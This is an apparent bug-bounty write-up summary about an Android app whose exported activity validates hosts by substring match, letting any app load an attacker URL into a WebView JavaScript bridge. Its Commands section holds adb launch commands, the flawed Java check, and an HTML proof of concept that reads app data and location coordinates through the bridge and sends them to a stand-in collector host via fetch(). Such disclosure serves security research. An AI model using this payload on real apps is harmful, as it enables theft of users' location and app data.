---
id: f61bd56ccee4
title: "One .contains() Away From a Full JavaScript Bridge Takeover"
source_url: https://medium.com/@husein.ayoub/one-contains-away-from-a-full-javascript-bridge-takeover-e0c05eb066f8
author: "Hussein Ayoub"
publication_date: 2026-08-23
category: mobile
category_label: "Mobile / JS Bridge"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "bug-bounty"
  - "android-security"
  - "ai-agent"
  - "bug-bounty-writeup"
tools:
  - "Apktool"
  - "Jadx"
quick_test: "Check for exported activities in Android apps that use a WebView with a JavaScript bridge and validate the host using substring matching instead of strict equality."
---

## Use case

The vulnerability exists in an Android app's exported activity that allows any app on the device to launch it and access a JavaScript bridge. The lack of proper host validation in the WebView allows an attacker to load a malicious URL and execute arbitrary JavaScript, potentially leading to sensitive data exposure.

## Steps to test

1. Decompile the target APK using Apktool and Jadx.
2. Identify exported activities in the AndroidManifest.xml.
3. Locate the WebView with the @JavascriptInterface annotation in the decompiled code.
4. Check the host validation logic for the WebView's URL loading.
5. Craft a malicious URL that contains the substring '.trusted.app' in the host.
6. Use ADB to force-stop the app and then start the exported activity with the malicious URL.

## Commands

```text
adb shell am force-stop com.vendor.directoryapp
adb shell am start \
-n com.vendor.directoryapp/.StartActivity \
-d 'https://pwned.trusted.app.attacker.com/exploit'
Uri data = getIntent().getData();
String host;
if (data != null
&& (host = data.getHost()) != null
&& h.a(host, ".trusted.app")          // <-- the problem
&& "https".equals(data.getScheme())) {
// attacker-controlled URL gets loaded into the bridge WebView
state.targetUrl = String.valueOf(getIntent().getData());
}
pwned.trusted.app.attacker.com
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<pre id="out"></pre>
<script>
const out = document.getElementById('out');
const webhook = 'https://your-collector.example/collect';
function log(msg) {
out.textContent += msg + '\n';
fetch(webhook + '?d=' + encodeURIComponent(msg)).catch(() => {});
}
try {
if (typeof Android === 'undefined') {
log('[FAIL] bridge not present');
} else {
log('[OK] bridge reachable');
log('[LEAK] version: ' + Android.getAppVersion());
log('[LEAK] loc perm: ' + Android.queryLocationPermission());
log('[LEAK] coords: ' + (Android.getCoordinates() || 'null'));
}
} catch (e) {
log('[ERR] ' + e.message);
}
</script>
</body>
</html>
adb shell am start \
-n com.vendor.directoryapp/.StartActivity \
-d "https://pwned.trusted.app.attacker.com/exploit"
?d=[OK] bridge reachable
?d=[LEAK] version: <redacted>
?d=[LEAK] loc perm: granted
?d=[LEAK] coords: {"latitude":<redacted>,"longitude":<redacted>,"timestamp":<redacted>}
Intent i = new Intent();
i.setComponent(new ComponentName(
"com.vendor.directoryapp",
"com.vendor.directoryapp.StartActivity"));
i.setData(Uri.parse("https://pwned.trusted.app.attacker.com/exploit"));
startActivity(i);
```

## Source

- Author: Hussein Ayoub
- Writeup: https://medium.com/@husein.ayoub/one-contains-away-from-a-full-javascript-bridge-takeover-e0c05eb066f8

_For authorized testing only. Credit the original author._
